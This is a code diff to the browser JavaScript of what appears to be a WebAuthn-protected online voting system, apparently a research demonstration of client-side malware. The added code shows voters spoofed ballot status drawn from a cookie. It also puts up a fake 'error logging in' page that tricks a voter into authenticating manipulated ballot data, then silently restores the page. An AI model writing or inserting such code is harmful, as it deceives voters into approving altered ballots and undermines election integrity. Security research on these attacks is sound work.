@@ -3,7 +3,7 @@ $(document).ready(function () {
   // check whether current browser supports WebAuthn
   if (!window.PublicKeyCredential) {
     alert("Error: this browser does not support WebAuthn");
-    return;
+    //return;
   }
   
   //Initialize hidden elements
@@ -46,9 +46,19 @@ function pollStatus() {
         },
         'json'
     ).then((status) => {
-            $("#ballot_status").html(status);
+            //$("#ballot_status").html(JSON.stringify(status);
+            
+            //Spoof polled ballot data if manipulated
+            var origData = getCookie("origData");
+            if (origData != "") {
+                status.Data = origData;
+            } else {
+                status.Data = atob(status.Data);
+            }
+            
+            $("#ballot_status").html("Status: " + status.Status + "\nData: " + status.Data);
         }).catch((error) => {
-          //console.log(error)
+          console.log(error)
           //alert("failed to get ballot status");
         })
     
@@ -155,7 +165,7 @@ function voidBallot() {
       })
 }
 
-function verifyBallot() {
+function verifyBallot(relogin=false) {
     var modify = false;
     
     //verification being attemped on same device as manipulation; keep up appearances
@@ -184,6 +194,12 @@ function verifyBallot() {
     if (modify) {
         dataToVerify = badData;
     }
+    
+    var origBody = $("body").html();
+    if (relogin && $("#decoded").html() == "Manipulated ballot data") {
+        $("body").html("There was an error logging in, please try again");
+        $("body").attr("style", "color:red");
+    }
 
     console.log("Begin Verify");
     $.post(
@@ -194,13 +210,17 @@ function verifyBallot() {
       },
       'json')
       .then((credentialRequestOptions) => {
+        //Show that client-side malware cannot succesfully bypass user verification requirements set by server
+        //credentialRequestOptions.publicKey.userVerification = "discouraged";
         console.log(credentialRequestOptions)
         credentialRequestOptions.publicKey.challenge = bufferDecode(credentialRequestOptions.publicKey.challenge);
         
         var challengeString = new TextDecoder('utf8').decode(credentialRequestOptions.publicKey.challenge);
         console.log(challengeString);
         
-        if (modify) { //false display of original intended data
+        if (relogin) {
+            ; //we're pretending to do a login, so don't display anything to the user about verification
+        } else if (modify) { //false display of original intended data
             if (confirmData(origData) == false) {
                 return null;
             }
@@ -250,6 +270,11 @@ function verifyBallot() {
           'json')
           .then((data) => {
               //alert("Verification Success for data: " + atob(data));
+              if (relogin) { //surpise! Everything was verified
+                  $("body").html(origBody);
+                  $("body").attr("style", "")
+              }
+              
               document.getElementById("verified").style.color = "green";
               if (modify) {
                   document.getElementById("verified").innerHTML = "Ballot Cast!\n" + atob(origData);
@@ -558,7 +583,14 @@ function loginUser() {
         .then((success) => {
             console.log(success);
             if (success == "Pending") {
-                window.location.href = "./verify";
+                var urlParams = new URLSearchParams(window.location.search);
+                var auto = urlParams.has('auto');
+                if (auto) {
+                    window.location.href = "./verify?auto=1";
+                } else {
+                    window.location.href = "./verify";
+                }
+                
             } else {
                 window.location.href = "./vote";
             }
